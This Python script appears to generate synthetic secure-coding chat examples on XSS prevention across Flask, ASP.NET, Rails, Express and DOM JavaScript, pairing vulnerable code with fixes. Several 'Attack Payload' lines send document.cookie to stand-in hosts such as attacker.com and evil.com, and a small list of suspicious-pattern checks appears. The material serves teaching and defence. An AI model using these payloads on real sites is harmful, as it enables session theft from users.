#!/usr/bin/env python3
"""
Expand XSS Batch 003 from 5 to 10 examples.
Adds examples 006-010 with diverse language coverage.
"""

import json
from pathlib import Path
from datetime import date


def create_base_metadata(language, example_num):
    """Create base metadata for XSS examples."""
    return {
        "lang": language,
        "category": "injection",
        "subcategory": "xss",
        "owasp_2021": "A03:2021-Injection",
        "cwe": "CWE-79",
        "severity": "HIGH",
        "complexity": "intermediate",
        "created": str(date.today()),
        "validated": False
    }


def example_006_python_flask():
    """Python/Flask - Reflected XSS in Template"""

    user_turn_1 = "I'm building a Flask search page. How do I safely display the search query back to the user?"

    assistant_turn_1 = """I'll show you the vulnerable approach first, then the secure implementation.

**VULNERABLE CODE - DO NOT USE:**

```python
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route('/search')
def search():
    query = request.args.get('q', '')

    # DANGER: Directly embedding user input in template
    template = '''
    <html>
        <body>
            <h1>Search Results</h1>
            <p>You searched for: ''' + query + '''</p>
            <div id="results">
                <!-- Search results here -->
            </div>
        </body>
    </html>
    '''

    return render_template_string(template)

if __name__ == '__main__':
    app.run(debug=True)
```

**Attack Payload:**

```
/search?q=<script>alert(document.cookie)</script>
/search?q=<img src=x onerror="fetch('https://attacker.com?c='+document.cookie)">
```

**Why This is Dangerous:**

1. User input directly concatenated into HTML
2. No escaping or sanitization
3. Arbitrary JavaScript execution
4. Can steal cookies, session tokens, or redirect users

**SECURE IMPLEMENTATION:**

```python
from flask import Flask, request, render_template, escape
from markupsafe import Markup
import html

app = Flask(__name__)

@app.route('/search')
def search_secure():
    query = request.args.get('q', '')

    # Escape user input
    safe_query = html.escape(query)

    return render_template('search.html', query=safe_query)

# In templates/search.html:
# <h1>Search Results</h1>
# <p>You searched for: {{ query }}</p>
#
# Jinja2 automatically escapes {{ }} variables
```

**Defense Layers:**

1. **Automatic Escaping**: Jinja2 templates auto-escape by default
2. **Explicit Escaping**: Use `html.escape()` for extra safety
3. **Never Use**: `render_template_string()` with user input
4. **Content Security Policy**: Add CSP headers

```python
from flask import Flask, make_response

@app.after_request
def set_csp(response):
    response.headers['Content-Security-Policy'] = "default-src 'self'"
    return response
```
"""

    user_turn_2 = "What if I need to allow some HTML formatting in the search results, like highlighting search terms?"

    assistant_turn_2 = """For safe HTML rendering with highlighting, use a combination of sanitization and controlled markup:

```python
from flask import Flask, request, render_template
from markupsafe import Markup
import html
import re

app = Flask(__name__)

def safe_highlight(text, query):
    # Safely highlight search terms without XSS risk
    # Escape both text and query first
    safe_text = html.escape(text)
    safe_query = html.escape(query)

    # Use regex to find and wrap matches (already escaped)
    if safe_query:
        pattern = re.escape(safe_query)
        highlighted = re.sub(
            f'({pattern})',
            r'<mark>\1</mark>',
            safe_text,
            flags=re.IGNORECASE
        )
        # Mark as safe ONLY because we escaped first
        return Markup(highlighted)

    return safe_text

@app.route('/search')
def search_with_highlights():
    query = request.args.get('q', '')

    # Simulate search results
    results = [
        "Cross-site scripting attacks are common",
        "XSS prevention requires proper escaping",
        "Script injection can steal credentials"
    ]

    # Safely highlight search terms
    highlighted_results = [
        safe_highlight(result, query) for result in results
    ]

    return render_template(
        'search_results.html',
        query=html.escape(query),
        results=highlighted_results
    )
```

**Key Safety Principles:**

1. **Escape First**: Always escape user input BEFORE processing
2. **Limited Markup**: Only add known-safe HTML tags
3. **Markup() Carefully**: Only use after escaping user data
4. **Validate Query**: Limit query length and characters

```python
def validate_search_query(query):
    # Validate search query before processing
    if not query or len(query) > 100:
        return None

    # Remove potentially dangerous characters
    safe_chars = re.compile(r'^[a-zA-Z0-9\s\-_]+$')
    if not safe_chars.match(query):
        return None

    return query
```

This approach ensures highlighting works without introducing XSS vulnerabilities."""

    metadata = create_base_metadata("python", 6)

    return {
        "id": "xss-000006",
        "conversations": [
            {"from": "human", "value": user_turn_1},
            {"from": "assistant", "value": assistant_turn_1},
            {"from": "human", "value": user_turn_2},
            {"from": "assistant", "value": assistant_turn_2}
        ],
        "metadata": metadata
    }


def example_007_csharp_aspnet():
    """C# ASP.NET - XSS in Web Forms"""

    user_turn_1 = "I'm building an ASP.NET page that displays user comments. How do I prevent XSS?"

    assistant_turn_1 = """I'll demonstrate the vulnerable pattern and the secure approach.

**VULNERABLE CODE - DO NOT USE:**

```csharp
// CommentDisplay.aspx.cs
using System;
using System.Web.UI;

public partial class CommentDisplay : Page
{
    protected void Page_Load(object sender, EventArgs e)
    {
        string username = Request.QueryString["user"];
        string comment = Request.QueryString["comment"];

        // DANGER: Directly writing user input to page
        Response.Write("<div class='comment'>");
        Response.Write("<strong>" + username + "</strong>: ");
        Response.Write(comment);
        Response.Write("</div>");
    }
}
```

**Attack Payloads:**

```
?user=Attacker&comment=<script>alert('XSS')</script>
?user=<img src=x onerror=alert(1)>&comment=Check this out!
```

**SECURE IMPLEMENTATION:**

```csharp
using System;
using System.Web;
using System.Web.UI;
using System.Web.Security.AntiXss;

public partial class CommentDisplaySecure : Page
{
    protected void Page_Load(object sender, EventArgs e)
    {
        string username = Request.QueryString["user"];
        string comment = Request.QueryString["comment"];

        // Method 1: Use Server.HtmlEncode
        string safeUsername = Server.HtmlEncode(username);
        string safeComment = Server.HtmlEncode(comment);

        Response.Write("<div class='comment'>");
        Response.Write("<strong>" + safeUsername + "</strong>: ");
        Response.Write(safeComment);
        Response.Write("</div>");
    }
}
```

**Best Practices:**

1. **Always Encode**: Use `Server.HtmlEncode()` for all user input
2. **Use AntiXSS Library**: Microsoft AntiXSS provides additional protection
3. **ASP.NET Controls**: Prefer server controls that auto-encode

```csharp
// In .aspx markup:
<asp:Label ID="UsernameLabel" runat="server" />
<asp:Label ID="CommentLabel" runat="server" />

// In code-behind:
protected void Page_Load(object sender, EventArgs e)
{
    // Labels automatically HTML-encode
    UsernameLabel.Text = Request.QueryString["user"];
    CommentLabel.Text = Request.QueryString["comment"];
}
```
"""

    user_turn_2 = "What about allowing users to include links in their comments safely?"

    assistant_turn_2 = """For safe link handling in user comments, use allowlisting and the AntiXSS library:

```csharp
using System;
using System.Text.RegularExpressions;
using System.Web;
using System.Web.Security.AntiXss;

public class SafeCommentRenderer
{
    public static string RenderComment(string comment)
    {
        if (string.IsNullOrEmpty(comment))
            return string.Empty;

        // First, HTML encode everything
        string safe = AntiXssEncoder.HtmlEncode(comment, true);

        // Then convert safe URLs to links
        safe = ConvertSafeUrls(safe);

        return safe;
    }

    private static string ConvertSafeUrls(string text)
    {
        // Only allow http:// and https:// URLs
        string pattern = @"(https?://[^\s<>""]+)";

        return Regex.Replace(text, pattern, match =>
        {
            string url = match.Groups[1].Value;

            // Validate URL
            if (IsValidUrl(url))
            {
                // Encode for attribute context
                string safeUrl = AntiXssEncoder.HtmlAttributeEncode(url);
                return $"<a href=\"{safeUrl}\" rel=\"noopener noreferrer\" target=\"_blank\">{url}</a>";
            }

            return url;
        });
    }

    private static bool IsValidUrl(string url)
    {
        // Allowlist: only http and https
        if (!url.StartsWith("http://") && !url.StartsWith("https://"))
            return false;

        // Blocklist: prevent javascript: and data: URLs
        if (url.Contains("javascript:") || url.Contains("data:"))
            return false;

        // Additional validation
        return Uri.IsWellFormedUriString(url, UriKind.Absolute);
    }
}

// Usage:
protected void Page_Load(object sender, EventArgs e)
{
    string comment = Request.QueryString["comment"];
    string safeHtml = SafeCommentRenderer.RenderComment(comment);

    // Use Literal control for HTML output
    CommentLiteral.Text = safeHtml;
}
```

**Security Measures:**

1. **Encode First**: All input is HTML-encoded before processing
2. **URL Allowlist**: Only http/https protocols permitted
3. **Attribute Encoding**: URLs in href attributes are separately encoded
4. **rel="noopener"**: Prevents tab-nabbing attacks
5. **Strict Validation**: Reject malformed or suspicious URLs

This ensures users can share links without introducing XSS vulnerabilities."""

    metadata = create_base_metadata("c#", 7)

    return {
        "id": "xss-000007",
        "conversations": [
            {"from": "human", "value": user_turn_1},
            {"from": "assistant", "value": assistant_turn_1},
            {"from": "human", "value": user_turn_2},
            {"from": "assistant", "value": assistant_turn_2}
        ],
        "metadata": metadata
    }


def example_008_ruby_rails():
    """Ruby on Rails - XSS in Views"""

    user_turn_1 = "I'm building a Rails app with user profiles. How do I safely display user bios that might contain formatting?"

    assistant_turn_1 = """I'll show you the XSS vulnerability and the secure Rails approach.

**VULNERABLE CODE - DO NOT USE:**

```ruby
# app/controllers/profiles_controller.rb
class ProfilesController < ApplicationController
  def show
    @user = User.find(params[:id])
  end
end

# app/views/profiles/show.html.erb
<div class="profile">
  <h1><%= @user.name %></h1>

  <!-- DANGER: raw() bypasses HTML escaping -->
  <div class="bio">
    <%= raw @user.bio %>
  </div>
</div>
```

**Attack Payload:**

If user sets bio to:
```html
<script>fetch('https://evil.com?cookie='+document.cookie)</script>
<img src=x onerror="alert(document.domain)">
```

**SECURE IMPLEMENTATION:**

```ruby
# app/controllers/profiles_controller.rb
class ProfilesController < ApplicationController
  def show
    @user = User.find(params[:id])
  end
end

# app/views/profiles/show.html.erb
<div class="profile">
  <h1><%= @user.name %></h1>

  <!-- Rails automatically escapes <%= %> -->
  <div class="bio">
    <%= @user.bio %>
  </div>
</div>
```

**Rails Built-in Protection:**

1. **Auto-Escaping**: `<%= %>` automatically HTML-escapes
2. **Never Use `raw()`**: Unless you've sanitized first
3. **Never Use `html_safe`**: Without proper sanitization

**Additional Security:**

```ruby
# app/models/user.rb
class User < ApplicationRecord
  # Validate bio content
  validates :bio, length: { maximum: 500 }

  # Sanitize before saving
  before_save :sanitize_bio

  private

  def sanitize_bio
    # Remove all HTML tags
    self.bio = ActionController::Base.helpers.sanitize(
      self.bio,
      tags: [],
      attributes: []
    )
  end
end
```
"""

    user_turn_2 = "What if I want to allow basic formatting like bold and italics in user bios?"

    assistant_turn_2 = """For safe formatting, use Rails' sanitize helper with a strict allowlist:

```ruby
# app/helpers/profiles_helper.rb
module ProfilesHelper
  def safe_bio(bio_text)
    sanitize(bio_text,
      tags: %w[b i em strong p br],
      attributes: {}
    )
  end
end

# app/views/profiles/show.html.erb
<div class="bio">
  <%= safe_bio(@user.bio).html_safe %>
</div>
```

**Production-Ready Approach with Markdown:**

```ruby
# Gemfile
gem 'redcarpet'
gem 'rouge'  # For syntax highlighting

# app/helpers/profiles_helper.rb
require 'redcarpet'
require 'redcarpet/render_strip'

module ProfilesHelper
  def render_bio_markdown(text)
    return '' if text.blank?

    # Configure safe Markdown renderer
    renderer = Redcarpet::Render::HTML.new(
      filter_html: true,        # Strip raw HTML
      no_images: true,           # No images
      no_links: false,           # Allow links
      hard_wrap: true,           # Convert newlines to br
      link_attributes: {         # Add security attrs to links
        rel: 'nofollow noopener noreferrer',
        target: '_blank'
      }
    )

    markdown = Redcarpet::Markdown.new(
      renderer,
      autolink: true,            # Auto-link URLs
      no_intra_emphasis: true,   # Disable _ emphasis
      strikethrough: true,       # Enable ~~strikethrough~~
      superscript: false,        # Disable superscript
      tables: false              # No tables
    )

    # Render and mark as safe (already sanitized by Redcarpet)
    markdown.render(text).html_safe
  end
end

# app/models/user.rb
class User < ApplicationRecord
  validates :bio, length: { maximum: 1000 }

  # Strip dangerous content before save
  before_save :clean_bio

  private

  def clean_bio
    return if bio.blank?

    # Remove script tags, event handlers, etc.
    self.bio = ActionController::Base.helpers.sanitize(
      bio,
      tags: %w[],  # Remove all HTML first
      attributes: []
    )
  end
end

# app/views/profiles/show.html.erb
<div class="bio">
  <%= render_bio_markdown(@user.bio) %>
</div>
```

**Key Security Points:**

1. **Markdown Over HTML**: Safer than allowing raw HTML
2. **filter_html: true**: Strips any raw HTML in input
3. **no_images: true**: Prevents image-based attacks
4. **Link Security**: rel="noopener" prevents tab-nabbing
5. **Sanitize Before Save**: Double protection at model level
6. **Content-Security-Policy**: Add CSP headers in production

```ruby
# config/initializers/content_security_policy.rb
Rails.application.config.content_security_policy do |policy|
  policy.default_src :self
  policy.script_src  :self
  policy.style_src   :self, :unsafe_inline
end
```

This gives users formatting options while maintaining strong XSS protection."""

    metadata = create_base_metadata("ruby", 8)

    return {
        "id": "xss-000008",
        "conversations": [
            {"from": "human", "value": user_turn_1},
            {"from": "assistant", "value": assistant_turn_1},
            {"from": "human", "value": user_turn_2},
            {"from": "assistant", "value": assistant_turn_2}
        ],
        "metadata": metadata
    }


def example_009_typescript_express():
    """TypeScript/Express - XSS in API Response"""

    user_turn_1 = "I'm building a TypeScript API that returns HTML snippets. How do I prevent XSS in the responses?"

    assistant_turn_1 = """I'll demonstrate the vulnerability and secure implementation for HTML API responses.

**VULNERABLE CODE - DO NOT USE:**

```javascript
// src/routes/snippets.ts
const express = require('express');
const router = express.Router();

router.get('/snippet', (req, res) => {
    const title = req.query.title;
    const content = req.query.content;

    // DANGER: Directly embedding user input in HTML response
    const html = `
        <div class="snippet">
            <h2>${title}</h2>
            <p>${content}</p>
        </div>
    `;

    res.send(html);
});

module.exports = router;
```

**Attack Payloads:**

```
GET /snippet?title=<script>alert(1)</script>&content=test
GET /snippet?title=Test&content=<img src=x onerror="fetch('https://evil.com?c='+document.cookie)">
```

**SECURE IMPLEMENTATION:**

```javascript
const express = require('express');
const createDOMPurify = require('dompurify');
const { JSDOM } = require('jsdom');

const window = new JSDOM('').window;
const DOMPurify = createDOMPurify(window);

const router = express.Router();

function escapeHtml(unsafe) {
    return unsafe
        .replace(/&/g, "&amp;")
        .replace(/</g, "&lt;")
        .replace(/>/g, "&gt;")
        .replace(/"/g, "&quot;")
        .replace(/'/g, "&#039;");
}

router.get('/snippet', (req, res) => {
    const title = req.query.title;
    const content = req.query.content;

    // Escape user input
    const safeTitle = escapeHtml(title);
    const safeContent = escapeHtml(content);

    const html = `
        <div class="snippet">
            <h2>${safeTitle}</h2>
            <p>${safeContent}</p>
        </div>
    `;

    // Set security headers
    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    res.setHeader('X-Content-Type-Options', 'nosniff');
    res.setHeader('Content-Security-Policy', "default-src 'self'");

    res.send(html);
});

module.exports = router;
```

**Defense Layers:**

1. **HTML Escaping**: Convert special characters
2. **Security Headers**: CSP, X-Content-Type-Options
3. **Input Validation**: Validate before escaping

```javascript
function validateSnippetInput(title, content) {
    if (!title || !content) {
        throw new Error('Title and content required');
    }

    if (title.length > 100 || content.length > 1000) {
        throw new Error('Input too long');
    }

    return { title, content };
}
```
"""

    user_turn_2 = "What if I need to support some HTML formatting like bold and links in the content?"

    assistant_turn_2 = """For controlled HTML formatting, use DOMPurify with a strict configuration:

```javascript
const express = require('express');
const createDOMPurify = require('dompurify');
const { JSDOM } = require('jsdom');

const window = new JSDOM('').window;
const DOMPurify = createDOMPurify(window);

const router = express.Router();

function escapeHtml(unsafe) {
    return unsafe
        .replace(/&/g, "&amp;")
        .replace(/</g, "&lt;")
        .replace(/>/g, "&gt;")
        .replace(/"/g, "&quot;")
        .replace(/'/g, "&#039;");
}

function sanitizeContent(html) {
    // Configure DOMPurify with strict allowlist
    const clean = DOMPurify.sanitize(html, {
        ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br'],
        ALLOWED_ATTR: ['href', 'title'],
        ALLOW_DATA_ATTR: false,
        ALLOWED_URI_REGEXP: /^https?:\/\//
    });

    return clean;
}

router.post('/snippet', (req, res) => {
    try {
        const { title, content } = req.body;

        // Validate inputs
        if (!title || !content) {
            return res.status(400).json({ error: 'Missing required fields' });
        }

        if (title.length > 100 || content.length > 2000) {
            return res.status(400).json({ error: 'Input too long' });
        }

        // Escape title (no HTML allowed)
        const safeTitle = escapeHtml(title);

        // Sanitize content (limited HTML allowed)
        const safeContent = sanitizeContent(content);

        const html = `
            <div class="snippet" data-snippet-id="${req.body.id || 'new'}">
                <h2>${safeTitle}</h2>
                <div class="content">${safeContent}</div>
            </div>
        `;

        // Security headers
        res.setHeader('Content-Type', 'text/html; charset=utf-8');
        res.setHeader('X-Content-Type-Options', 'nosniff');
        res.setHeader('Content-Security-Policy',
            "default-src 'none'; style-src 'self'"
        );

        res.send(html);

    } catch (error) {
        res.status(500).json({ error: 'Internal server error' });
    }
});

module.exports = router;
```

**Enhanced Security with TypeScript:**

```javascript
function createSecureSnippetRenderer() {
    const DOMPurify = createDOMPurify(new JSDOM('').window);

    const config = {
        ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br'],
        ALLOWED_ATTR: ['href', 'title'],
        ALLOW_DATA_ATTR: false,
        ALLOWED_URI_REGEXP: /^https?:\/\//,

        // Add hooks for additional security
        hooks: {
            afterSanitizeAttributes: function(node) {
                // Add security attributes to all links
                if (node.tagName === 'A') {
                    node.setAttribute('rel', 'noopener noreferrer');
                    node.setAttribute('target', '_blank');
                }
            }
        }
    };

    return {
        renderSnippet(title, content) {
            const safeTitle = escapeHtml(title);
            const safeContent = DOMPurify.sanitize(content, config);

            return `
                <div class="snippet">
                    <h2>${safeTitle}</h2>
                    <div class="content">${safeContent}</div>
                </div>
            `;
        }
    };
}

const renderer = createSecureSnippetRenderer();

router.post('/snippet', (req, res) => {
    const html = renderer.renderSnippet(req.body.title, req.body.content);
    res.send(html);
});
```

**Best Practices:**

1. **Minimal Allowlist**: Only essential tags/attributes
2. **URL Validation**: Only http/https protocols
3. **Link Security**: Auto-add rel="noopener noreferrer"
4. **CSP Headers**: Prevent inline scripts
5. **TypeScript Types**: Enforce input contracts

This provides safe HTML rendering with user formatting capabilities."""

    metadata = create_base_metadata("typescript", 9)

    return {
        "id": "xss-000009",
        "conversations": [
            {"from": "human", "value": user_turn_1},
            {"from": "assistant", "value": assistant_turn_1},
            {"from": "human", "value": user_turn_2},
            {"from": "assistant", "value": assistant_turn_2}
        ],
        "metadata": metadata
    }


def example_010_javascript_dom():
    """JavaScript - XSS via DOM Manipulation"""

    user_turn_1 = "I'm updating the DOM based on URL parameters. What's the safe way to do this?"

    assistant_turn_1 = """I'll show you a common DOM-based XSS vulnerability and the secure approach.

**VULNERABLE CODE - DO NOT USE:**

```javascript
// Vulnerable DOM manipulation
function displayWelcomeMessage() {
    // DANGER: location.search contains user-controlled data
    const params = new URLSearchParams(location.search);
    const username = params.get('name');

    // DANGER: innerHTML with user input
    document.getElementById('welcome').innerHTML =
        'Welcome back, <strong>' + username + '</strong>!';
}

// Called on page load
window.onload = displayWelcomeMessage;
```

**Attack Payloads:**

```
?name=<img src=x onerror="alert(document.cookie)">
?name=<script>fetch('https://evil.com?c='+document.cookie)</script>
```

**SECURE IMPLEMENTATION:**

```javascript
function displayWelcomeMessageSecure() {
    const params = new URLSearchParams(location.search);
    const username = params.get('name');

    if (!username) return;

    // Create elements safely using DOM methods
    const welcomeDiv = document.getElementById('welcome');
    const messageText = document.createTextNode('Welcome back, ');
    const strongElement = document.createElement('strong');
    const nameText = document.createTextNode(username);

    // Build DOM tree
    strongElement.appendChild(nameText);
    welcomeDiv.appendChild(messageText);
    welcomeDiv.appendChild(strongElement);
    welcomeDiv.appendChild(document.createTextNode('!'));
}

// Alternative using textContent
function displayWelcomeAlternative() {
    const params = new URLSearchParams(location.search);
    const username = params.get('name');

    if (!username) return;

    const welcomeDiv = document.getElementById('welcome');

    // Clear and use textContent (no HTML parsing)
    welcomeDiv.textContent = '';

    const span = document.createElement('span');
    span.textContent = `Welcome back, ${username}!`;

    welcomeDiv.appendChild(span);
}

window.onload = displayWelcomeMessageSecure;
```

**Key Security Principles:**

1. **Never Use innerHTML**: With user input
2. **Use textContent**: For text-only content
3. **DOM Methods**: createElement, createTextNode, appendChild
4. **Validate Input**: Check and sanitize parameters

```javascript
function sanitizeUsername(name) {
    if (!name || typeof name !== 'string') return '';

    // Remove dangerous characters
    return name.replace(/[<>\"']/g, '');
}
```
"""

    user_turn_2 = "What if I'm building a rich text editor and need to insert formatted HTML?"

    assistant_turn_2 = """For rich text content, use DOMPurify to sanitize before inserting:

```javascript
function createSafeRichTextEditor() {
    // Include DOMPurify library
    // <script src="https://cdn.jsdelivr.net/npm/dompurify@3.0.0/dist/purify.min.js"></script>

    function insertFormattedContent(targetElement, htmlContent) {
        // Sanitize with strict configuration
        const cleanHTML = DOMPurify.sanitize(htmlContent, {
            ALLOWED_TAGS: ['p', 'br', 'strong', 'em', 'b', 'i', 'u', 'a', 'ul', 'ol', 'li'],
            ALLOWED_ATTR: ['href', 'title', 'target'],
            ALLOW_DATA_ATTR: false
        });

        // Now safe to use innerHTML
        targetElement.innerHTML = cleanHTML;
    }

    function setupEditor() {
        const editor = document.getElementById('editor');
        const preview = document.getElementById('preview');

        editor.addEventListener('input', () => {
            const content = editor.value;
            insertFormattedContent(preview, content);
        });
    }

    return { setupEditor, insertFormattedContent };
}

// Initialize
const richTextEditor = createSafeRichTextEditor();
richTextEditor.setupEditor();
```

**Production-Grade Implementation:**

```javascript
class SecureContentRenderer {
    constructor() {
        this.purifyConfig = {
            ALLOWED_TAGS: [
                'p', 'br', 'span', 'div',
                'strong', 'em', 'b', 'i', 'u', 's',
                'a', 'ul', 'ol', 'li',
                'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
                'blockquote', 'code', 'pre'
            ],
            ALLOWED_ATTR: ['href', 'title', 'class'],
            ALLOW_DATA_ATTR: false,
            ALLOWED_URI_REGEXP: /^(?:https?|mailto):/,

            // Add security attributes to links
            ADD_ATTR: ['target'],
            hooks: {
                afterSanitizeAttributes: (node) => {
                    if (node.tagName === 'A') {
                        node.setAttribute('rel', 'noopener noreferrer');
                        node.setAttribute('target', '_blank');
                    }
                }
            }
        };
    }

    render(container, htmlContent) {
        if (!htmlContent || typeof htmlContent !== 'string') {
            container.textContent = '';
            return;
        }

        // Sanitize HTML
        const clean = DOMPurify.sanitize(htmlContent, this.purifyConfig);

        // Insert sanitized content
        container.innerHTML = clean;
    }

    renderFromURL(container, paramName) {
        const params = new URLSearchParams(location.search);
        const content = params.get(paramName);

        if (!content) {
            container.textContent = 'No content provided';
            return;
        }

        // Validate and render
        if (this.validateContent(content)) {
            this.render(container, content);
        } else {
            container.textContent = 'Invalid content';
        }
    }

    validateContent(content) {
        // Check content length
        if (content.length > 10000) return false;

        // Check for suspicious patterns (before sanitization)
        const suspiciousPatterns = [
            /<script/i,
            /javascript:/i,
            /onerror=/i,
            /onload=/i
        ];

        return !suspiciousPatterns.some(pattern => pattern.test(content));
    }
}

// Usage
const renderer = new SecureContentRenderer();
const contentDiv = document.getElementById('user-content');

// From URL parameters
renderer.renderFromURL(contentDiv, 'content');

// From user input
const userInput = document.getElementById('rich-editor').value;
renderer.render(contentDiv, userInput);
```

**Defense in Depth:**

1. **DOMPurify Sanitization**: Primary defense
2. **Strict Allowlist**: Minimal tags and attributes
3. **URL Protocol Validation**: Only http/https/mailto
4. **Link Security**: Auto-add security attributes
5. **Input Validation**: Pre-sanitization checks
6. **CSP Headers**: Add Content-Security-Policy

```javascript
// Add CSP meta tag dynamically
const csp = document.createElement('meta');
csp.httpEquiv = 'Content-Security-Policy';
csp.content = "default-src 'self'; script-src 'self' 'unsafe-inline' https://cdn.jsdelivr.net";
document.head.appendChild(csp);
```

This provides secure rich text rendering while maintaining functionality."""

    metadata = create_base_metadata("javascript", 10)

    return {
        "id": "xss-000010",
        "conversations": [
            {"from": "human", "value": user_turn_1},
            {"from": "assistant", "value": assistant_turn_1},
            {"from": "human", "value": user_turn_2},
            {"from": "assistant", "value": assistant_turn_2}
        ],
        "metadata": metadata
    }


def main():
    """Generate 5 new XSS examples to expand Batch 003."""

    examples = [
        example_006_python_flask(),
        example_007_csharp_aspnet(),
        example_008_ruby_rails(),
        example_009_typescript_express(),
        example_010_javascript_dom()
    ]

    # Read existing batch 003
    batch_003_file = Path(__file__).parent.parent / 'data' / 'xss_batch_003.jsonl'
    existing_examples = []

    with open(batch_003_file, 'r', encoding='utf-8') as f:
        for line in f:
            existing_examples.append(json.loads(line))

    print(f"Loaded {len(existing_examples)} existing examples from Batch 003")

    # Combine with new examples
    all_examples = existing_examples + examples

    # Write expanded batch
    with open(batch_003_file, 'w', encoding='utf-8') as f:
        for example in all_examples:
            f.write(json.dumps(example, ensure_ascii=False) + '\n')

    print(f"\nExpanded Batch 003 to {len(all_examples)} examples")
    print(f"Output: {batch_003_file}")
    print("\nNew examples added:")
    for ex in examples:
        print(f"  {ex['id']}: {ex['metadata']['lang']}")

    return 0


if __name__ == "__main__":
    exit(main())
